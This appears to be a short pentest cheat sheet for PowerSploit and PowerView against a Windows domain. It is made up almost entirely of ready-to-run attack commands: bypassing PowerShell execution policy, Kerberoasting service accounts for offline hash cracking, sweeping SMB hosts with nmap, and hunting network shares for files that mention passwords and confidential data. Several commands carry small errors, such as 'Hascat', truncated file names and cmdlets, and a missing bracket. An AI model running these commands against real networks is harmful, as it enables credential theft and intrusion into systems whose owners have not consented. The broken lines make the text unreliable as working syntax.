# PowerSploit 

## Run as
If you want to use a Windows that is not on the domain perform the following command first on a cmd:
```
runas /netonly /user:{Domain\User} "cmd.exe"
powershell.exe -ExecutionPolicy Bypass
```

## Import PowerSploit modules
```
Import-Module PowerSploit
```

## SID 
 - Domain SID:
```
Get-DomainSID -Domain <domain> -DomainController <ipDc
```
 - User SID:
```
Get-NetUser -UserName <UserName> -Domain <Domain> -DomainController <DomainController> 
```

## Kerberoasting
```
Invoke-Kerberoast -OutputFormat Hascat | fl Hash
Invoke-Kerberoast -AdminCount 
Invoke-Kerberoast -Domain toto.local
```

## Discovery 
```
nmap -vv -Pn -n -p 445 10.10.10.0/24 -oA smb_host
grep open smb_host.gnmap | awk {'print $2'} > smb_up.txt && cat smb_up.txt
```

 - PowerView for finding interesting shares
```
Invoke-ShareFinder -ComputerFile smb_up.txt -NoPing -CheckShareAccess | Out-File -Encoding ascii found_shares.tx
```
 - PowerView for finding files with interesting terms
```
Invoke-FileFinder -ShareList found_shares.txt -Terms backup, confidential, password -OutFile results.csv -Verbose

Invoke-FileFinder -ShareList found_shares.txt -Terms backup, confidential, password, Photos -Verbose | ForEach-Object {Get-Acl $_.FullName} | Format-Lis
```
